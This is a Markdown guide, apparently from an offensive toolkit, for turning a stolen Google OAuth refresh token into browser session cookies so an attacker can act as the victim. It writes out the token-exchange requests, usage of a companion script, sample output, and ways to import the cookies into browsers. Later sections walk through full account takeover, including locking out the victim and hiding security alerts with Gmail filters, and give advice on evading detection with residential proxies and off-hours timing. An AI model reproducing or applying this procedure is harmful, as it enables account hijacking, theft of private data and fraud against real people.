# Google OAuth Token to Browser Session Cookie Access

> **How to convert a stolen `1//` refresh token into a full browser session** - so you can open Gmail, Google Drive, and all Google services in your own browser as the victim.

---

## Table of Contents

1. [Why Browser Access?](#1-why-browser-access)
2. [The Uberauth Flow Explained](#2-the-uberauth-flow-explained)
3. [Using the Script](#3-using-the-script)
4. [Importing Cookies Into Chrome](#4-importing-cookies-into-chrome)
5. [Importing Cookies Into Firefox](#5-importing-cookies-into-firefox)
6. [Using Cookies From the CLI](#6-using-cookies-from-the-cli)
7. [Troubleshooting](#7-troubleshooting)
8. [What You Can Do With Browser Access](#8-what-you-can-do-with-browser-access)
9. [Detection & Risks](#9-detection--risks)

---

## 1. Why Browser Access?

The `test_token.py` script gives you **API access** — but browser access gives you **everything** the victim has:

| Capability | API Access (test_token.py) | Browser Access (token_to_session.py) |
|-----------|------------------------------|----------------------------------------|
| Read Gmail | Yes (if scope allows) | Yes |
| Send email | Yes (if scope allows) | Yes |
| Change Google password | No API for this | Yes |
| Access security settings | No API for this | Yes |
| View 2FA backup codes | No API for this | Yes |
| Download Drive files | Only if Drive scope present | Yes |
| Delete account history | No API for this | Yes |
| Sign out all other sessions | No API for this | Yes |
| Bypass OAuth scope limits | Bound to token's scopes | Full account access |

**Bottom line:** API access is good for automation. Browser access is good for **full account takeover**.

---

## 2. The Uberauth Flow Explained

Google uses a mechanism called **uberauth** internally in Chromium to convert OAuth tokens into browser session cookies. The flow has three steps:

```
Step 1: 1//...  --> POST /token -->  ya29... (access token)
Step 2: ya29... --> GET /OAuthLogin?issueuberauth=1 -->  uberauth_token
Step 3: uberauth_token --> GET /OAuthLogin?uberauth=... -->  Set-Cookie: SAPISID, SSID, HSID...
```

### Step 1: Refresh Token to Access Token

```
POST https://oauth2.googleapis.com/token
Content-Type: application/x-www-form-urlencoded

client_id=77185425430.apps.googleusercontent.com
&refresh_token=1//09BnKKxzaOFS9C...
&grant_type=refresh_token
```

Response:
```json
{
  "access_token": "ya29.a0AfB...",
  "expires_in": 3600,
  "scope": "email profile openid https://www.googleapis.com/auth/gmail.readonly"
}
```

### Step 2: Access Token to Uberauth Token

```
GET https://accounts.google.com/accounts/OAuthLogin
    ?source=ChromiumBrowser
    &issueuberauth=1
Authorization: Bearer ya29.a0AfB...
```

Response body is the **uberauth token** — a long opaque string.

### Step 3: Uberauth Token to Session Cookies

```
GET https://accounts.google.com/accounts/OAuthLogin
    ?source=ChromiumBrowser
    &uberauth=ALlI5O...
```

This endpoint responds with a redirect that sets `Set-Cookie` headers for:
- `SAPISID` — Used by Google's JavaScript APIs
- `SSID` — Session ID
- `HSID` — Hash of session ID
- `APISID` — Another session ID
- `SID` — The main session cookie
- `__Secure-1PSID` / `__Secure-3PSID` — Secure variants

Once you have these cookies in your browser, Google treats you as the authenticated victim.

---

## 3. Using the Script

The companion script is at [`token_to_session.py`](../token_to_session.py).

### Basic Usage

```bash
# From a 1// refresh token file
python token_to_session.py path/to/token.txt

# From an inline token
python token_to_session.py "1//09BnKKxzaOFS9CgYIARAAGAkN..."

# From a ya29 access token directly (skip step 1)
python token_to_session.py "ya29.a0AfB..."
```

### With a Proxy

Essential for victims in other countries:

```bash
python token_to_session.py token.txt \
    --proxy http://user:pass@residential-proxy:8080
```

### Custom Output

```bash
python token_to_session.py token.txt --output victim1_cookies
```

This produces:
- `victim1_cookies.txt` — Netscape format (curl/browsers)
- `victim1_cookies.json` — EditThisCookie format (Chrome extension)

### What Success Looks Like

```
============================================================
 Google OAuth Token >> Browser Session Cookies
============================================================

[1/4] Loading token...
  [+] Token loaded: 1//09BnKKxzaOFS9CgYIARAAGAkN...

[2/4] Exchanging 1// refresh token for access token...
  [+] Client ID 77185425430... -> OK
  [+] Access token: ya29.a0AfB... (expires in 3600s)

[3/4] Requesting uberauth token...
  [+] Uberauth token: ALlI5O... (156 chars)

[4/4] Consuming uberauth to capture session cookies...
  [+] Captured 8 cookie(s)
      SAPISID: HPLhC1DfFm...
      SSID: A55gSDF...
      HSID: Abc123...
      APISID: XYZ789...
      SID: g.a000...
      __Secure-1PSID: g.a000...

  [+] Saved: victim1_cookies.txt (420 bytes, Netscape format)
  [+] Saved: victim1_cookies.json (780 bytes, EditThisCookie format)
```

---

## 4. Importing Cookies Into Chrome

### Method A: EditThisCookie (Recommended)

1. Install **[EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg)** from Chrome Web Store
2. **Important:** Open a fresh Chrome profile or guest window
3. Navigate to `https://accounts.google.com` (do NOT sign in)
4. Click the EditThisCookie icon (cookie icon in the toolbar)
5. Click the trash icon -> "Remove all cookies" to clear any existing Google cookies
6. Click the **Import** button (folder icon)
7. Select the `google_session_cookies.json` file
8. Click the **Play** button to apply
9. Refresh the page -> you should see the victim's Google profile
10. Navigate to `https://mail.google.com` -> their inbox

### Method B: Chrome DevTools Protocol (Puppeteer)

```bash
# Using Puppeteer
node -e "
const puppeteer = require('puppeteer');
const cookies = require('./google_session_cookies.json');
(async () => {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();
  await page.setCookie(...cookies);
  await page.goto('https://mail.google.com');
})();
"
```

### Method C: Cookie-Editor Extension

Install [Cookie-Editor](https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnmalmem), then:
1. Open `https://accounts.google.com`
2. Click the Cookie-Editor icon
3. Delete all existing cookies
4. Click "Import" -> paste the JSON content
5. Click the checkmark to save
6. Refresh

---

## 5. Importing Cookies Into Firefox

### Method A: Cookie Quick Manager

1. Install **[Cookie Quick Manager](https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/)** add-on
2. Open `https://accounts.google.com`
3. Click the Cookie Quick Manager icon
4. Select the google.com domain
5. Click "Delete All" to clear existing cookies
6. Click "Import" -> select the `google_session_cookies.txt` file (Netscape format)
7. Click "Save"
8. Refresh the page -> you're logged in

### Method B: Manual via Storage Inspector

1. Open Firefox Dev Tools (F12)
2. Go to the **Storage** tab
3. Expand **Cookies** -> select `https://accounts.google.com`
4. Right-click -> "Delete All"
5. Click the + icon to add each cookie from the Netscape file
6. Refresh

---

## 6. Using Cookies From the CLI

### curl

```bash
curl --cookie google_session_cookies.txt \
     --cookie-jar /dev/null \
     -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36' \
     -L 'https://mail.google.com/mail/u/0/#inbox' 2>/dev/null \
     | grep -oP '<title>[^<]+</title>'
```

### Python requests

```python
import requests
from http.cookiejar import MozillaCookieJar

cj = MozillaCookieJar("google_session_cookies.txt")
cj.load()
resp = requests.get("https://mail.google.com", cookies=cj)
print(resp.text[:2000])
```

---

## 7. Troubleshooting

### "HTTP 403 - token expired or lacks scope"

The access token expired or the refresh token doesn't have sufficient scope. Try:
- Re-run (the script auto-refreshes the token)
- Use a residential proxy in the victim's country

### "No cookies received"

The uberauth was consumed but Google didn't return session cookies. Common causes:
- **Geo mismatch:** Google's risk engine blocked the request. Use a residential proxy.
- **Token revoked:** The victim revoked the token. Try running `test_token.py` first.
- **Rate limiting:** Too many requests too fast. Wait 5 minutes and retry.

### Missing `__Secure-1PSID` or `__Secure-3PSID`

This is normal — some cookies are only set when the uberauth request uses HTTPS and returns a proper redirect. The SAPISID/SSID/HSID cookies are usually sufficient for basic access.

### "SAPISID cookie not found"

The most critical cookie for Google API access. Without it, some pages may not load properly. Try:
- Using a different client ID
- Using a residential proxy
- The token may lack the `profile` or `email` scope needed

### Cookies imported but Google shows sign-in page

Chrome may have detected the cookie import and cleared them (security feature). Try:
- Use **EditThisCookie** extension (it prevents Chrome from auto-clearing)
- Use a **fresh Chrome profile** (no other Google cookies)
- Ensure you imported ALL cookies from the file, not just some
- Close and reopen the browser before navigating to Google

---

## 8. What You Can Do With Browser Access

Once the cookies are loaded:

### Immediate
- Read all Gmail messages (inbox, sent, spam, trash)
- Search for password reset emails from banks, crypto exchanges, social media
- View Google Drive files
- Access Google Photos
- View YouTube history / private videos

### Account Takeover
- Change the Google account password (Settings -> Security -> Password)
- View/Save 2FA backup codes
- Add your own recovery email/phone
- Remove the victim's recovery options
- Sign out all other sessions (locks out the victim)
- Delete the account

### Stealth / Persistence
- Add Gmail forwarding rule - all incoming email sent to you
- Create Gmail filters to hide security alerts from the victim
- Create app passwords for services that don't support OAuth
- Set up recovery options pointing to your own contact info

---

## 9. Detection & Risks

### How the Victim Can Detect This

1. **Google Security Checkup:** shows active sessions and devices
2. **Email notifications:** Google may email the victim about "New device signed in" or "Password changed"
3. **Gmail forwarding notification:** Google emails the victim when forwarding is added
4. **Session conflicts:** If the victim is actively using their account, they may be signed out

### Risk Mitigation

- Use a residential proxy matching the victim's geo
- Work during the victim's off-hours (check their timezone in context.md)
- Check the victim's last active time before making changes
- Don't change the password until you've extracted everything you need
- Set up forwarding first (read quietly), then escalate

### Cookie Lifespan

| Cookie | Typical Lifespan |
|--------|-----------------|
| SAPISID | 2 weeks (rolling refresh) |
| SSID/HSID | 6 months |
| SID | 2 years |
| __Secure-* | 2 years |

After importing, the cookies will stay valid for weeks to months — as long as the victim doesn't:
- Sign out of all sessions
- Change their password
- Explicitly revoke the token
- Google doesn't force a re-auth (rare)

---

*Reference: Chromium source code (google_apis/gaia/), Google OAuth 2.0 documentation, and empirical testing.*
